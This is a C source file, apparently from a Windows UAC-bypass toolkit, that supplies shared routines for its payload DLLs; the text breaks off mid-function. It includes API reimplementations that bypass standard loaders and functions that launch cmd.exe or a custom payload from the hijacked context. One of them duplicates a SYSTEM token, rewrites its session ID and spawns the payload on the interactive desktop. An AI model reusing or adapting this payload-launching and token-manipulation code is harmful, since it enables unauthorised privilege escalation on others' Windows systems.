/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2018
*
*  TITLE:       UTIL.C
*
*  VERSION:     3.00
*
*  DATE:        27 Aug 2018
*
*  Global support routines file shared between payload dlls.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#undef _TRACE_CALL

#include "shared.h"

/*
* ucmPingBack
*
* Purpose:
*
* Does what it called.
*
*/
VOID ucmPingBack(
    VOID
)
{
    HANDLE hEvent = NULL;
    UNICODE_STRING usSignalEvent = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\CZ2128");
    OBJECT_ATTRIBUTES obja;

#ifdef _TRACE_CALL 
    OutputDebugString(L"service>ping back\r\n");
#endif

    InitializeObjectAttributes(&obja, &usSignalEvent, OBJ_CASE_INSENSITIVE, NULL, NULL);
    if (NT_SUCCESS(NtOpenEvent(&hEvent, EVENT_ALL_ACCESS, &obja))) {
#ifdef _TRACE_CALL
        OutputDebugString(L"service>>pingback event found");
#endif
        NtSetEvent(hEvent, NULL);
        NtClose(hEvent);
    }
}

/*
* ucmPrivilegeEnabled
*
* Purpose:
*
* Tests if the given token has the given privilege enabled/enabled by default.
*
*/
BOOLEAN ucmPrivilegeEnabled(
    _In_ HANDLE hToken,
    _In_ ULONG Privilege
)
{
    NTSTATUS status;
    PRIVILEGE_SET Privs;
    BOOLEAN bResult = FALSE;

    Privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    Privs.PrivilegeCount = 1;
    Privs.Privilege[0].Luid.LowPart = Privilege;
    Privs.Privilege[0].Luid.HighPart = 0;
    Privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;

    status = NtPrivilegeCheck(hToken, &Privs, &bResult);
    RtlSetLastWin32Error(RtlNtStatusToDosError(status));

    return bResult;
}

/*
* ucmReadValue
*
* Purpose:
*
* Read given value to output buffer.
* Returned Buffer must be released with RtlFreeHeap after use.
*
*/
NTSTATUS ucmReadValue(
    _In_ HANDLE hKey,
    _In_ LPWSTR ValueName,
    _In_ DWORD ValueType,
    _Out_ PVOID *Buffer,
    _Out_ ULONG *BufferSize
)
{
    KEY_VALUE_PARTIAL_INFORMATION *kvpi;
    UNICODE_STRING usName;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    ULONG Length = 0;
    PVOID CopyBuffer = NULL;

    HANDLE ProcessHeap = NtCurrentPeb()->ProcessHeap;

    *Buffer = NULL;
    *BufferSize = 0;

    RtlInitUnicodeString(&usName, ValueName);
    Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, NULL, 0, &Length);
    if (Status == STATUS_BUFFER_TOO_SMALL) {

        kvpi = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, Length);
        if (kvpi) {

            Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, kvpi, Length, &Length);
            if (NT_SUCCESS(Status)) {

                if (kvpi->Type == ValueType) {

                    CopyBuffer = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, kvpi->DataLength);
                    if (CopyBuffer) {
                        RtlCopyMemory(CopyBuffer, kvpi->Data, kvpi->DataLength);
                        *Buffer = CopyBuffer;
                        *BufferSize = kvpi->DataLength;
                        Status = STATUS_SUCCESS;
                    }
                    else
                    {
                        Status = STATUS_NO_MEMORY;
                    }

                }
                else {

                    Status = STATUS_OBJECT_TYPE_MISMATCH;

                }

            }
            RtlFreeHeap(ProcessHeap, 0, kvpi);
        }
        else {
            Status = STATUS_NO_MEMORY;
        }
    }

    return Status;
}

/*
* ucmCreateSyncMutant
*
* Purpose:
*
* Create mutant for synchronization.
*
*/
NTSTATUS ucmCreateSyncMutant(
    _Out_ PHANDLE phMutant
)
{
    UNICODE_STRING us = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Nagumo");
    OBJECT_ATTRIBUTES obja;
    
    InitializeObjectAttributes(&obja, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
        
    return NtCreateMutant(phMutant, MUTANT_ALL_ACCESS, &obja, FALSE);
}

/*
* ucmEnumSystemObjects
*
* Purpose:
*
* Lookup object by name in given directory.
*
*/
NTSTATUS NTAPI ucmEnumSystemObjects(
    _In_opt_ LPWSTR pwszRootDirectory,
    _In_opt_ HANDLE hRootDirectory,
    _In_ PENUMOBJECTSCALLBACK CallbackProc,
    _In_opt_ PVOID CallbackParam
)
{
    BOOL                cond = TRUE;
    ULONG               ctx, rlen;
    HANDLE              hDirectory = NULL;
    NTSTATUS            status;
    NTSTATUS            CallbackStatus;
    OBJECT_ATTRIBUTES   attr;
    UNICODE_STRING      sname;

    POBJECT_DIRECTORY_INFORMATION	objinf;

    if (CallbackProc == NULL) {
        return STATUS_INVALID_PARAMETER_4;
    }

    status = STATUS_UNSUCCESSFUL;

    // We can use root directory.
    if (pwszRootDirectory != NULL) {
        RtlInitUnicodeString(&sname, pwszRootDirectory);
        InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);
        status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);
        if (!NT_SUCCESS(status)) {
            return status;
        }
    }
    else {
        if (hRootDirectory == NULL) {
            return STATUS_INVALID_PARAMETER_2;
        }
        hDirectory = hRootDirectory;
    }

    // Enumerate objects in directory.
    ctx = 0;
    do {

        rlen = 0;
        status = NtQueryDirectoryObject(hDirectory, NULL, 0, TRUE, FALSE, &ctx, &rlen);
        if (status != STATUS_BUFFER_TOO_SMALL)
            break;

        objinf = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, rlen);
        if (objinf == NULL)
            break;

        status = NtQueryDirectoryObject(hDirectory, objinf, rlen, TRUE, FALSE, &ctx, &rlen);
        if (!NT_SUCCESS(status)) {
            RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);
            break;
        }

        CallbackStatus = CallbackProc(objinf, CallbackParam);

        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, objinf);

        if (NT_SUCCESS(CallbackStatus)) {
            status = STATUS_SUCCESS;
            break;
        }

    } while (cond);

    if (hDirectory != NULL) {
        NtClose(hDirectory);
    }
    return status;
}

/*
* ucmDetectObjectCallback
*
* Purpose:
*
* Comparer callback routine used in objects enumeration.
*
*/
NTSTATUS NTAPI ucmDetectObjectCallback(
    _In_ POBJECT_DIRECTORY_INFORMATION Entry,
    _In_ PVOID CallbackParam
)
{
    SIZE_T BufferSize;
    POBJSCANPARAM Param = (POBJSCANPARAM)CallbackParam;

    if (Entry == NULL) {
        return STATUS_INVALID_PARAMETER_1;
    }

    if (CallbackParam == NULL) {
        return STATUS_INVALID_PARAMETER_2;
    }

    if (Entry->Name.Buffer) {
        BufferSize = Entry->Name.Length + sizeof(UNICODE_NULL);
        Param->Buffer = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, BufferSize);
        if (Param->Buffer) {
            Param->BufferSize = BufferSize;
            _strncpy(
                Param->Buffer, Param->BufferSize / sizeof(WCHAR),
                Entry->Name.Buffer, Entry->Name.Length / sizeof(WCHAR)
            );
            return STATUS_SUCCESS;
        }
    }
    return STATUS_UNSUCCESSFUL;
}

/*
* ucmLdrGetProcAddress
*
* Purpose:
*
* Reimplemented GetProcAddress.
*
*/
LPVOID ucmLdrGetProcAddress(
    _In_ PCHAR ImageBase,
    _In_ PCHAR RoutineName
)
{
    USHORT OrdinalNumber;
    PULONG NameTableBase;
    PUSHORT NameOrdinalTableBase;
    PULONG Addr;
    LONG Result, High, Low = 0, Middle = 0;
    LPVOID FunctionAddress = NULL;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;

    PIMAGE_FILE_HEADER			fh1 = NULL;
    PIMAGE_OPTIONAL_HEADER32	oh32 = NULL;
    PIMAGE_OPTIONAL_HEADER64	oh64 = NULL;

    fh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew + sizeof(DWORD));
    oh32 = (PIMAGE_OPTIONAL_HEADER32)((ULONG_PTR)fh1 + sizeof(IMAGE_FILE_HEADER));
    oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;

    if (fh1->Machine == IMAGE_FILE_MACHINE_AMD64) {
        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
            oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    }
    else {
        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
            oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    }

    NameTableBase = (PULONG)(ImageBase + (ULONG)ExportDirectory->AddressOfNames);
    NameOrdinalTableBase = (PUSHORT)(ImageBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);
    High = ExportDirectory->NumberOfNames - 1;
    while (High >= Low) {

        Middle = (Low + High) >> 1;

        Result = _strcmpi_a(
            RoutineName,
            (PCHAR)(ImageBase + NameTableBase[Middle])
        );

        if (Result < 0)
            High = Middle - 1;
        else
            if (Result > 0)
                Low = Middle + 1;
            else
                break;
    } //while
    if (High < Low)
        return NULL;

    OrdinalNumber = NameOrdinalTableBase[Middle];
    if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions)
        return NULL;

    Addr = (PDWORD)((DWORD_PTR)ImageBase + ExportDirectory->AddressOfFunctions);
    FunctionAddress = (LPVOID)((DWORD_PTR)ImageBase + Addr[OrdinalNumber]);

    return FunctionAddress;
}

/*
* ucmGetStartupInfo
*
* Purpose:
*
* Reimplemented GetStartupInfoW.
*
*/
VOID ucmGetStartupInfo(
    _In_ LPSTARTUPINFOW lpStartupInfo
)
{
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;

    if (lpStartupInfo == NULL) {
        return;
    }

    ProcessParameters = NtCurrentPeb()->ProcessParameters;

    lpStartupInfo->cb = sizeof(*lpStartupInfo);
    lpStartupInfo->lpReserved = (LPWSTR)ProcessParameters->ShellInfo.Buffer;
    lpStartupInfo->lpDesktop = (LPWSTR)ProcessParameters->DesktopInfo.Buffer;
    lpStartupInfo->lpTitle = (LPWSTR)ProcessParameters->WindowTitle.Buffer;
    lpStartupInfo->dwX = ProcessParameters->StartingX;
    lpStartupInfo->dwY = ProcessParameters->StartingY;
    lpStartupInfo->dwXSize = ProcessParameters->CountX;
    lpStartupInfo->dwYSize = ProcessParameters->CountY;
    lpStartupInfo->dwXCountChars = ProcessParameters->CountCharsX;
    lpStartupInfo->dwYCountChars = ProcessParameters->CountCharsY;
    lpStartupInfo->dwFillAttribute = ProcessParameters->FillAttribute;
    lpStartupInfo->dwFlags = ProcessParameters->WindowFlags;
    lpStartupInfo->wShowWindow = (WORD)ProcessParameters->ShowWindowFlags;
    lpStartupInfo->cbReserved2 = ProcessParameters->RuntimeData.Length;
    lpStartupInfo->lpReserved2 = (LPBYTE)ProcessParameters->RuntimeData.Buffer;

    if (lpStartupInfo->dwFlags & (STARTF_USESTDHANDLES | STARTF_USEHOTKEY)) {
        lpStartupInfo->hStdInput = ProcessParameters->StandardInput;
        lpStartupInfo->hStdOutput = ProcessParameters->StandardOutput;
        lpStartupInfo->hStdError = ProcessParameters->StandardError;
    }
}

/*
* ucmExpandEnvironmentStrings
*
* Purpose:
*
* Reimplemented ExpandEnvironmentStrings.
*
*/
DWORD ucmExpandEnvironmentStrings(
    _In_ LPCWSTR lpSrc,
    _Out_writes_to_opt_(nSize, return) LPWSTR lpDst,
    _In_ DWORD nSize
)
{
    NTSTATUS Status;
    SIZE_T SrcLength = 0, ReturnLength = 0, DstLength = (SIZE_T)nSize;

    if (lpSrc) {
        SrcLength = _strlen(lpSrc);
    }

    Status = RtlExpandEnvironmentStrings(
        NULL,
        (PWSTR)lpSrc,
        SrcLength,
        (PWSTR)lpDst,
        DstLength,
        &ReturnLength);

    if ((NT_SUCCESS(Status)) || (Status == STATUS_BUFFER_TOO_SMALL)) {

        if (ReturnLength <= MAXDWORD32)
            return (DWORD)ReturnLength;

        Status = STATUS_UNSUCCESSFUL;
    }
    RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
    return 0;
}

/*
* ucmGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given InfoClass.
*
* Returned buffer must be freed with HeapFree after usage.
* Function will return error after 20 attempts.
*
*/
PVOID ucmGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS InfoClass
)
{
    INT			c = 0;
    PVOID		Buffer = NULL;
    ULONG		Size = 0x1000;
    NTSTATUS	status;
    ULONG       memIO;

    do {
        Buffer = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, (SIZE_T)Size);
        if (Buffer != NULL) {
            status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
        }
        else {
            return NULL;
        }
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Buffer);
            Buffer = NULL;
            Size *= 2;
            c++;
            if (c > 20) {
                status = STATUS_SECRET_TOO_LONG;
                break;
            }
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (NT_SUCCESS(status)) {
        return Buffer;
    }

    if (Buffer) {
        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Buffer);
    }
    return NULL;
}

/*
* ucmLaunchPayload
*
* Purpose:
*
* Run payload (by default cmd.exe from system32)
*
*/
BOOL ucmLaunchPayload(
    _In_opt_ LPWSTR pszPayload,
    _In_opt_ DWORD cbPayload)
{
    BOOL                    bResult = FALSE, bCommandLineAllocated = FALSE;
    WCHAR                   cmdbuf[MAX_PATH * 2]; //complete process command line
    WCHAR                   sysdir[MAX_PATH + 1]; //process working directory
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE;

    HANDLE                  ProcessHeap = NtCurrentPeb()->ProcessHeap;
    LPWSTR                  lpApplicationName = NULL, lpCommandLine = NULL;
    SIZE_T                  memIO;


    //
    // Query working directory.
    //
    // Note: 2.84
    // To provide compatibility with %systemroot% replacement method (44) read systemroot from UserSharedData.
    //
    RtlSecureZeroMemory(sysdir, sizeof(sysdir));
    _strcpy(sysdir, USER_SHARED_DATA->NtSystemRoot);
    _strcat(sysdir, L"\\system32\\");

    //
    // Query startup info from parent.
    //
    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ucmGetStartupInfo(&startupInfo);

    //
    // Determine what we want to execute, custom parameter or default cmd.exe
    //
    if ((pszPayload) && (cbPayload)) {

        //
        // We can use custom payload, copy it to internal buffer.
        //
        memIO = 0x1000 + cbPayload;

        lpCommandLine = RtlAllocateHeap(
            ProcessHeap,
            HEAP_ZERO_MEMORY,
            (SIZE_T)memIO);

        if (lpCommandLine) {

            dwCreationFlags = 0;
            bCommandLineAllocated = TRUE;
            RtlCopyMemory(
                lpCommandLine,
                pszPayload,
                cbPayload);

        }
    }
    else {

        //
        // Default cmd.exe should be started.
        //
        RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
        _strcpy(cmdbuf, sysdir);
        _strcat(cmdbuf, L"cmd.exe");

        lpApplicationName = cmdbuf;
        lpCommandLine = NULL;
        bCommandLineAllocated = FALSE;
        dwCreationFlags = CREATE_NEW_CONSOLE;
    }

    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_SHOW;

    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));

    //
    // Launch payload.
    //
    bResult = CreateProcessAsUser(NULL,
        lpApplicationName,
        lpCommandLine,
        NULL,
        NULL,
        FALSE,
        dwCreationFlags,
        NULL,
        sysdir,
        &startupInfo,
        &processInfo);

    if (bResult) {
        //
        // We don't need these handles, close them.
        //
        NtClose(processInfo.hProcess);
        NtClose(processInfo.hThread);
    }

    //
    // Post execution cleanup if required.
    //
    if (bCommandLineAllocated)
        RtlFreeHeap(ProcessHeap, 0, lpCommandLine);

    return bResult;
}

/*
* ucmLaunchPayloadEx
*
* Purpose:
*
* Run payload (by default cmd.exe from system32)
*
*/
BOOL ucmLaunchPayloadEx(
    _In_ PFNCREATEPROCESSW pCreateProcess,
    _In_opt_ LPWSTR pszPayload,
    _In_opt_ DWORD cbPayload)
{
    BOOL                    bResult = FALSE, bCommandLineAllocated = FALSE;
    WCHAR                   cmdbuf[MAX_PATH * 2]; //complete process command line
    WCHAR                   sysdir[MAX_PATH + 1]; //process working directory
    STARTUPINFO             startupInfo;
    PROCESS_INFORMATION     processInfo;

    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE, cch;

    HANDLE                  ProcessHeap = NtCurrentPeb()->ProcessHeap;
    LPWSTR                  lpApplicationName = NULL, lpCommandLine = NULL;
    SIZE_T                  memIO;

    if (pCreateProcess == NULL)
        return bResult;

    //
    // Query working directory.
    //
    RtlSecureZeroMemory(sysdir, sizeof(sysdir));
    cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
    if ((cch == 0) || (cch > MAX_PATH))
        return bResult;

    //
    // Query startup info from parent.
    //
    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ucmGetStartupInfo(&startupInfo);

    //
    // Determine what we want to execute, custom parameter or default cmd.exe
    //
    if ((pszPayload) && (cbPayload)) {

        //
        // We can use custom payload, copy it to internal buffer.
        //
        memIO = 0x1000 + cbPayload;

        lpCommandLine = RtlAllocateHeap(
            ProcessHeap,
            HEAP_ZERO_MEMORY,
            (SIZE_T)memIO);

        if (lpCommandLine) {

            dwCreationFlags = 0;
            bCommandLineAllocated = TRUE;
            RtlCopyMemory(
                lpCommandLine,
                pszPayload,
                cbPayload);

        }
    }
    else {

        //
        // Default cmd.exe should be started.
        //
        RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
        _strcpy(cmdbuf, sysdir);
        _strcat(cmdbuf, L"cmd.exe");

        lpApplicationName = cmdbuf;
        lpCommandLine = NULL;
        bCommandLineAllocated = FALSE;
        dwCreationFlags = CREATE_NEW_CONSOLE;
    }

    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_SHOW;

    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));

    //
    // Launch payload.
    //
    bResult = pCreateProcess(
        lpApplicationName,
        lpCommandLine,
        NULL,
        NULL,
        FALSE,
        dwCreationFlags,
        NULL,
        sysdir,
        &startupInfo,
        &processInfo);

    if (bResult) {
        //
        // We don't need these handles, close them.
        //
        NtClose(processInfo.hProcess);
        NtClose(processInfo.hThread);
    }

    //
    // Post execution cleanup if required.
    //
    if (bCommandLineAllocated)
        RtlFreeHeap(ProcessHeap, 0, lpCommandLine);

    return bResult;
}

/*
* ucmLaunchPayload2
*
* Purpose:
*
* Run payload (by default cmd.exe from system32)
*
*/
BOOL ucmLaunchPayload2(
    _In_ BOOL bIsLocalSystem,
    _In_ ULONG SessionId,
    _In_opt_ LPWSTR pszPayload,
    _In_opt_ DWORD cbPayload)
{
    BOOL                        bResult = FALSE, bCommandLineAllocated = FALSE, bSrvExec = FALSE, bCond = FALSE;
    WCHAR                       cmdbuf[MAX_PATH * 2]; //complete process command line
    WCHAR                       sysdir[MAX_PATH + 1]; //process working directory
    STARTUPINFO                 startupInfo;
    PROCESS_INFORMATION         processInfo;

    DWORD                       dwCreationFlags = CREATE_NEW_CONSOLE, cch;

    HANDLE                      ProcessHeap = NtCurrentPeb()->ProcessHeap;
    LPWSTR                      lpApplicationName = NULL, lpCommandLine = NULL;
    SIZE_T                      memIO;

    NTSTATUS                    status;
    HANDLE                      hToken = NULL, hDupToken = NULL;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES           obja;

    ULONG                       CurrentSessionId = NtCurrentPeb()->SessionId;

#ifdef _TRACE_CALL
    WCHAR                       szDebugBuf[1000];
#endif //_TRACE_CALL

    do {

        bSrvExec = ((bIsLocalSystem) && (CurrentSessionId != SessionId));

#ifdef _TRACE_CALL
        if (bSrvExec)
            OutputDebugString(L"bServExec");
#endif //_TRACE_CALL

        //
        // In case of service start, prepare token for CreateProcessAsUser.
        // Set token session id, to do this we need SE_TCB_PRIVILEGE, check it enabled.
        //
        if (bSrvExec) {

            status = NtOpenProcessToken(
                NtCurrentProcess(),
                TOKEN_ALL_ACCESS,
                &hToken);

            if (!NT_SUCCESS(status)) {
#ifdef _TRACE_CALL
                _strcpy(szDebugBuf, L"NtOpenProcessToken = 0x");
                ultohex(status, _strend(szDebugBuf));
                _strcat(szDebugBuf, L"\r\n");
                OutputDebugString(szDebugBuf);
#endif  //_TRACE_CALL
                break;
            }

#ifdef _TRACE_CALL
            if (!ucmPrivilegeEnabled(hToken, SE_ASSIGNPRIMARYTOKEN_PRIVILEGE)) {
                OutputDebugString(L"ucmPrivilegeEnabled->SE_ASSIGNPRIMARYTOKEN_PRIVILEGE not set\r\n");
            }
#endif //_TRACE_CALL

            if (!ucmPrivilegeEnabled(hToken, SE_TCB_PRIVILEGE)) {
#ifdef _TRACE_CALL
                OutputDebugString(L"ucmPrivilegeEnabled->SE_TCB_PRIVILEGE not set\r\n");
#endif //_TRACE_CALL
                break;
            }

            sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
            sqos.ImpersonationLevel = SecurityImpersonation;
            sqos.ContextTrackingMode = 0;
            sqos.EffectiveOnly = FALSE;
            InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
            obja.SecurityQualityOfService = &sqos;

            status = NtDuplicateToken(
                hToken,
                TOKEN_ALL_ACCESS,
                &obja,
                FALSE,
                TokenPrimary,
                &hDupToken);

            if (!NT_SUCCESS(status)) {
#ifdef _TRACE_CALL
                _strcpy(szDebugBuf, L"NtDuplicateToken = 0x");
                ultohex(status, _strend(szDebugBuf));
                _strcat(szDebugBuf, L"\r\n");
                OutputDebugString(szDebugBuf);
#endif //_TRACE_CALL
                break;
            }

            status = NtSetInformationToken(
                hDupToken,
                TokenSessionId,
                (PVOID)&SessionId,
                sizeof(ULONG));

            if (!NT_SUCCESS(status)) {
#ifdef _TRACE_CALL
                _strcpy(szDebugBuf, L"NtSetInformationToken = 0x");
                ultohex(status, _strend(szDebugBuf));
                _strcat(szDebugBuf, L"\r\n");
                 OutputDebugString(szDebugBuf);
#endif //_TRACE_CALL
                break;
            }

        }
        else {
            //
            // Not a service start, use default token value.
            //
            hDupToken = NULL;
        }

        //
        // Query working directory.
        //
        RtlSecureZeroMemory(sysdir, sizeof(sysdir));
        cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
        if ((cch == 0) || (cch > MAX_PATH)) {                      
#ifdef _TRACE_CALL
            OutputDebugString(L"ucmExpandEnvironmentStrings failed");
#endif //_TRACE_CALL
            break;
        }

#ifdef _TRACE_CALL
        OutputDebugString(sysdir);
#endif //_TRACE_CALL

        //
        // Query startup info from parent.
        //
        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        ucmGetStartupInfo(&startupInfo);

        //
        // Determine what we want to execute, custom parameter or default cmd.exe
        //
        if ((pszPayload) && (cbPayload)) {

#ifdef _TRACE_CALL
            OutputDebugString(L"payload present\r\n");
#endif //_TRACE_CALL

            //
            // We can use custom payload, copy it to internal buffer.
            //
            memIO = 0x1000 + cbPayload;

            lpCommandLine = RtlAllocateHeap(
                ProcessHeap,
                HEAP_ZERO_MEMORY,
                (SIZE_T)memIO);

            if (lpCommandLine) {

                dwCreationFlags = 0;
                bCommandLineAllocated = TRUE;
                RtlCopyMemory(
                    lpCommandLine,
                    pszPayload,
                    cbPayload);

            }
        }
        else {

            //
            // Default cmd.exe should be started.
            //
            RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
            _strcpy(cmdbuf, sysdir);
            _strcat(cmdbuf, L"cmd.exe");

            lpApplicationName = cmdbuf;
            lpCommandLine = NULL;
            bCommandLineAllocated = FALSE;
            dwCreationFlags = CREATE_NEW_CONSOLE;
        }

        startupInfo.dwFlags = STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_SHOW;

        RtlSecureZeroMemory(&processInfo, sizeof(processInfo));

        //
        // In case of start from service, force default WinStation and Desktop.
        //
        // Future note: maybe moved to registry settings as custom winsta param.
        //
        if (bSrvExec) {
            startupInfo.lpDesktop = TEXT("Winsta0\\Default");
        }

        //
        // Launch payload.
        //
        bResult = CreateProcessAsUser(
            hDupToken,
            lpApplicationName,
            lpCommandLine,
            NULL,
            NULL,
            FALSE,
            dwCreationFlags,
            NULL,
            sysdir,
            &startupInfo,
            &processInfo);

        if (bResult) {
#ifdef _TRACE_CALL
            OutputDebugString(L"CreateProcessAsUser success\r\n");
#endif //_TRACE_CALL
            //
            // We don't need these handles, close them.
            //
            NtClose(processInfo.hProcess);
            NtClose(processInfo.hThread);
        }
#ifdef _TRACE_CALL
        else {
            _strcpy(szDebugBuf, L"CreateProcessAsUser failed with code = 0x");
            ultohex(GetLastError(), _strend(szDebugBuf));
            _strcat(szDebugBuf, L"\r\n");
            OutputDebugString(szDebugBuf);
        }

#endif //_TRACE_CALL
   } while (bCond);

    //
    // Post execution cleanup if required.
    //
    if (bCommandLineAllocated)
        RtlFreeHeap(ProcessHeap, 0, lpCommandLine);

    if (bSrvExec) {
        if (hToken)
            NtClose(hToken);
        if (hDupToken)
            NtClose(hDupToken);
    }

    return bResult;
}

/*
* ucmQueryRuntimeInfo
*
* Purpose:
*
* Output current process runtime information.
*
*/
LPWSTR ucmQueryRuntimeInfo(
    _In_ BOOL ReturnData)
{
    BOOL bFound = FALSE;
    NTSTATUS status;
    DWORD dwIntegrityLevel;
    ULONG LengthNeeded = 0;
    ULONG SessionId = NtCurrentPeb()->SessionId;

    HANDLE hToken = NULL;
    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;

    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    TOKEN_USER *ptu = NULL;

    PROCESS_BASIC_INFORMATION pbi;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;
    PSYSTEM_PROCESSES_INFORMATION ProcessList, pList;

    LSA_OBJECT_ATTRIBUTES lobja;
    LSA_HANDLE PolicyHandle = NULL;
    PLSA_REFERENCED_DOMAIN_LIST ReferencedDomains = NULL;
    PLSA_TRANSLATED_NAME Names = NULL;
    SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;

    LPWSTR lpReport, lpValue = TEXT("Unknown");

    WCHAR szBuffer[MAX_PATH + 1];

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    if (GetModuleFileName(NULL, (LPWSTR)&szBuffer, MAX_PATH) == 0)
        return NULL;

    lpReport = RtlAllocateHeap(
        hHeap,
        HEAP_ZERO_MEMORY,
        0x2000);
    if (lpReport == NULL)
        return NULL;

    //
    // 1. Attach module name.
    //
    _strncpy(lpReport, MAX_PATH, szBuffer, MAX_PATH);

    //
    // 2. Inherited from.
    //
    RtlSecureZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
    status = NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &LengthNeeded);

    if (NT_SUCCESS(status)) {

        _strcpy(szBuffer, TEXT("\r\nInherited from PID="));
#ifdef _WIN64
        u64tostr(pbi.InheritedFromUniqueProcessId, _strend(szBuffer));
#else 
        ultostr((ULONG)pbi.InheritedFromUniqueProcessId, _strend(szBuffer));
#endif
        _strcat(lpReport, szBuffer);
        _strcat(lpReport, TEXT(" ("));

        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        bFound = FALSE;

        ProcessList = (PSYSTEM_PROCESSES_INFORMATION)ucmGetSystemInfo(SystemProcessInformation);
        if (ProcessList) {

            pList = ProcessList;

            for (;;) {

                if ((ULONG_PTR)pList->UniqueProcessId == pbi.InheritedFromUniqueProcessId) {

                    _strncpy(szBuffer,
                        MAX_PATH,
                        pList->ImageName.Buffer,
                        pList->ImageName.Length / sizeof(WCHAR));

                    bFound = TRUE;

                    break;
                }
                if (pList->NextEntryDelta == 0) {
                    break;
                }
                pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
            }
            RtlFreeHeap(hHeap, 0, ProcessList);
        }

        if (bFound) {
            _strcat(lpReport, szBuffer);
        }
        else {
            _strcat(lpReport, TEXT("Non-existent Process"));
        }
        _strcat(lpReport, TEXT(")"));

    }

    //
    // 3. Query various token releated data.
    //
    //
    // 3.1 Integrity value.
    // 3.2 User\Domain name
    // 3.3 Session info
    //
    status = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY,
        &hToken);

    if (NT_SUCCESS(status)) {

        LengthNeeded = 0;
        status = NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            NULL,
            0,
            &LengthNeeded);

        if (status == STATUS_BUFFER_TOO_SMALL) {

            pTIL = (PTOKEN_MANDATORY_LABEL)RtlAllocateHeap(
                hHeap,
                HEAP_ZERO_MEMORY,
                LengthNeeded);

            if (pTIL) {

                status = NtQueryInformationToken(
                    hToken,
                    TokenIntegrityLevel,
                    pTIL,
                    LengthNeeded,
                    &LengthNeeded);

